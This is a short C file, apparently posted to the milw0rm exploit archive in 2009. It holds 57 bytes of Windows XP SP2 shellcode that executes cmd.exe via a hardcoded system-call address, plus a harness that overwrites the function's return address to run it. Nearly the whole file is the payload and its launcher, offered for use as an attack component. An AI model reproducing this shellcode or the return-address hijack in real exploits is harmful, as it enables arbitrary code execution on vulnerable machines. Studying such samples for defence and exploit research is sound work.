/*
win32/xp sp2 cmd.exe 57 bytes
Author : Mountassif Moad
Big Thnx : Houssamix :d
Assembly Code : Secret
Changed by : Stack
Description : It is 57 Byte Shellcode which Execute Cmd.exe Tested Under Windows Xp SP2
*/
#include <stdlib.h>
#include <string.h>
unsigned char shellcode[] =
"\xB8\xFF\xEF\xFF\xFF\xF7\xD0\x2B\xE0\x55\x8B\xEC"
"\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45"
"\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45"
"\xFC\x65\xC6\x45\xFD\x78\xC6\x45\xFE\x65\x8D\x45"
"\xF8\x50\xBB\xC7\x93\xBF\x77\xFF\xD3";
int main ()
{
int *ret;
ret=(int *)&ret+2;
printf("Shellcode Length is : %d",strlen(shellcode));
(*ret)=(int)shellcode;
return 0;
}

// milw0rm.com [2009-02-03]